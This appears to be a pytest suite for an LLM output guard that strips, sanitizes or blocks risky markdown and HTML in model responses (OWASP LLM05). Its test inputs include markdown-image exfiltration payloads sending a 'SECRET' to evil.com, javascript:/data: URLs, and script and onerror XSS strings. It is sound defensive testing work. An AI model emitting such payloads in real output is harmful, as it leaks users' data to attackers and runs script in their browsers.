"""Improper output handling tests (OWASP LLM05)."""
import pytest
import yaml
from fastapi.testclient import TestClient

from app.config import settings
from app.main import app
from app.pipeline.output_handling import OutputHandlingPolicy, handle_output
from app.pipeline.policy import PolicyEngine
from sentinel import Guard, OutputBlocked

DEFAULT = OutputHandlingPolicy()  # images strip, links allow, html sanitize


def run(text, **kw):
    return handle_output(text, OutputHandlingPolicy(**kw))


class TestImages:
    def test_exfil_image_stripped_by_default(self):
        r = handle_output("Done ![x](https://evil.com/c?d=SECRET) ok", DEFAULT)
        assert "evil.com" not in r.text and "SECRET" not in r.text
        assert r.actions == ["strip_image"] and not r.blocked

    def test_alt_text_kept(self):
        assert handle_output("![a chart](https://e.com/i.png)", DEFAULT).text == "a chart"

    def test_reference_style_image(self):
        r = handle_output("![i][r]\n\n[r]: https://evil.com/?d=SECRET", DEFAULT)
        assert "evil.com" not in r.text

    def test_image_with_title_and_angle_url(self):
        r = handle_output('![i](<https://evil.com/a b> "t")', DEFAULT)
        assert "evil.com" not in r.text

    def test_image_in_link(self):
        r = handle_output("[![i](https://evil.com/p.png)](https://ok.com)", DEFAULT)
        assert "evil.com" not in r.text and "ok.com" in r.text

    def test_code_is_left_alone(self):
        text = "```\n![c](https://x.com/i.png)\n```\nand `![n](https://y.com/i.png)`"
        r = handle_output(text, DEFAULT)
        assert r.text == text and not r.findings

    def test_allow_mode(self):
        assert not run("![i](https://e.com/i.png)", images="allow").findings

    def test_block_mode(self):
        r = run("![i](https://e.com/i.png)", images="block")
        assert r.blocked

    def test_allowlist(self):
        p = dict(images="allowlist", allowed_domains=("cdn.acme.com",))
        ok = run("![i](https://cdn.acme.com/i.png) ![j](https://img.cdn.acme.com/j.png)", **p)
        assert not ok.findings
        bad = run("![i](https://cdn.acme.com.evil.com/i.png)", **p)
        assert "evil.com" not in bad.text
        assert "evil.com" not in run("![i](//evil.com/i.png)", **p).text
        assert not run("![i](/static/i.png)", **p).findings  # same-origin


class TestLinks:
    def test_links_allowed_by_default(self):
        t = "see [docs](https://docs.acme.com/x)"
        assert handle_output(t, DEFAULT).text == t

    def test_strip_links_keeps_text(self):
        r = run("[click here](https://evil.com/phish) now", links="strip")
        assert r.text == "click here now"

    def test_reference_autolink_and_bare_url(self):
        r = run("[x][r] <https://a.com> https://b.com/p. end\n\n[r]: https://c.com", links="strip")
        for host in ("a.com", "b.com", "c.com"):
            assert host not in r.text
        assert r.text.count("end") == 1

    def test_link_allowlist(self):
        p = dict(links="allowlist", allowed_domains=("acme.com",))
        r = run("[a](https://docs.acme.com) [b](https://evil.com) https://evil.com/z", **p)
        assert "docs.acme.com" in r.text and "evil.com" not in r.text

    def test_benign_link_definition_survives(self):
        t = "[x][r]\n\n[r]: https://ok.com"
        assert handle_output(t, DEFAULT).text == t

    @pytest.mark.parametrize("url", [
        "javascript:alert(1)", "JaVaScRiPt:alert(1)",
        "data:text/html;base64,AAAA", "vbscript:x",
    ])
    def test_dangerous_schemes_stripped_even_when_allowed(self, url):
        r = run(f"[a]({url}) ![b]({url})", links="allow", images="allow")
        assert ":" not in r.text.split("alert")[0] and "AAAA" not in r.text
        assert set(r.actions) == {"strip_link", "strip_image"}

    def test_unrewritable_syntax_fails_closed(self):
        # nested brackets in alt text defeat the rewrite; verification blocks it
        r = handle_output("![alt [nested]](https://evil.com/i.png)", DEFAULT)
        assert r.blocked and r.note == "verification_failed"

    def test_block_mode(self):
        assert run("[a](https://e.com)", links="block").blocked


class TestHtml:
    def test_script_removed(self):
        r = handle_output("hi <script>alert(1)</script>there", DEFAULT)
        assert "script" not in r.text and "alert" not in r.text
        assert "sanitize_html" in r.actions

    def test_event_handler_and_js_url_removed(self):
        r = handle_output('<img src=x onerror=alert(1)><a href="javascript:alert(1)">k</a>', DEFAULT)
        assert "onerror" not in r.text and "javascript" not in r.text

    def test_iframe_style_removed(self):
        r = handle_output("<iframe src='https://evil.com'></iframe><style>x{}</style>ok", DEFAULT)
        assert "iframe" not in r.text and "evil.com" not in r.text

    def test_html_img_follows_images_policy(self):
        r = handle_output('<img src="https://evil.com/x.png">', DEFAULT)
        assert "evil.com" not in r.text

    def test_plain_text_with_angle_brackets_untouched(self):
        t = "if a < b and c > d then 3 > 2 & more"
        r = handle_output(t, DEFAULT)
        assert r.text == t and not r.findings

    def test_block_mode(self):
        assert run("<b>x</b>", html="block").blocked

    def test_allow_mode(self):
        t = "<script>alert(1)</script>"
        assert handle_output(t, OutputHandlingPolicy(html="allow")).text == t


class TestPolicyAndConfig:
    def write(self, tmp_path, doc):
        (tmp_path / "app.yaml").write_text(yaml.safe_dump(doc))
        return PolicyEngine(policies_dir=tmp_path)

    def test_defaults_without_policy(self, tmp_path):
        p = self.write(tmp_path, {"id": "a"}).output_policy("a")
        assert (p.images, p.links, p.html) == ("strip", "allow", "sanitize")
        assert PolicyEngine(policies_dir=tmp_path).output_policy(None).images == "strip"

    def test_policy_overrides(self, tmp_path):
        eng = self.write(tmp_path, {"id": "a", "output": {
            "images": "allowlist", "links": "block", "html": "allow",
            "allowed_domains": ["Acme.com"]}})
        p = eng.output_policy("a")
        assert (p.images, p.links, p.html, p.allowed_domains) == (
            "allowlist", "block", "allow", ("acme.com",))

    @pytest.mark.parametrize("bad", [
        {"images": "nope"}, {"html": "strip"}, {"links": 1}, {"zzz": 1},
        {"allowed_domains": "acme.com"}, "x",
    ])
    def test_invalid_section_rejected(self, tmp_path, bad):
        with pytest.raises(ValueError):
            self.write(tmp_path, {"id": "a", "output": bad})

    def test_env_defaults(self, monkeypatch):
        monkeypatch.setattr(settings, "output_images", "allow")
        monkeypatch.setattr(settings, "output_allowed_domains", "a.com, B.org")
        p = OutputHandlingPolicy.from_settings()
        assert p.images == "allow" and p.allowed_domains == ("a.com", "b.org")


class TestSdk:
    def test_exfil_image_neutralized(self):
        out = Guard().check_output("Summary. ![x](https://evil.com/c?d=SECRET)")
        assert out.verdict != "block"
        assert "evil.com" not in out.sanitized_output
        assert out.pipeline.output_handling.actions == ["strip_image"]

    def test_clean_output_reports_stage_with_no_findings(self):
        out = Guard().check_output("Just a normal answer.")
        assert out.pipeline.output_handling.ran and not out.pipeline.output_handling.findings
        assert out.sanitized_output == "Just a normal answer."

    def test_block_policy_raises(self, tmp_path):
        (tmp_path / "bot.yaml").write_text(yaml.safe_dump({"id": "bot", "output": {"images": "block"}}))
        g = Guard(policy_dir=tmp_path)
        with pytest.raises(OutputBlocked) as e:
            g.check_output("![x](https://e.com/i.png)", application_id="bot", raise_on_block=True)
        assert e.value.blocked_at == "output_handling"

    def test_per_app_html_allow(self, tmp_path):
        (tmp_path / "code.yaml").write_text(yaml.safe_dump({"id": "code", "output": {"html": "allow"}}))
        g = Guard(policy_dir=tmp_path)
        out = g.check_output("Use <div class='a'>x</div>", application_id="code")
        assert "<div" in out.sanitized_output

    def test_global_switch_off(self, monkeypatch):
        monkeypatch.setattr(settings, "disable_output_handling", True)
        out = Guard().check_output("![x](https://evil.com/c?d=1)")
        assert "evil.com" in out.sanitized_output and out.pipeline.output_handling is None

    def test_later_stages_see_neutralized_text(self):
        # A secret hidden inside a stripped image URL must not reach the user
        out = Guard().check_output("ok ![x](https://evil.com/?k=abc)")
        assert "abc" not in out.sanitized_output


class TestRest:
    def test_image_stripped(self):
        with TestClient(app) as c:
            r = c.post("/v1/output/analyze", json={"output": "hi ![x](https://evil.com/?d=1)"})
            body = r.json()
            assert "evil.com" not in body["sanitized_output"]
            assert body["pipeline"]["output_handling"]["actions"] == ["strip_image"]

    def test_script_sanitized(self):
        with TestClient(app) as c:
            r = c.post("/v1/output/analyze", json={"output": "x <script>alert(1)</script>"})
            assert "script" not in r.json()["sanitized_output"]
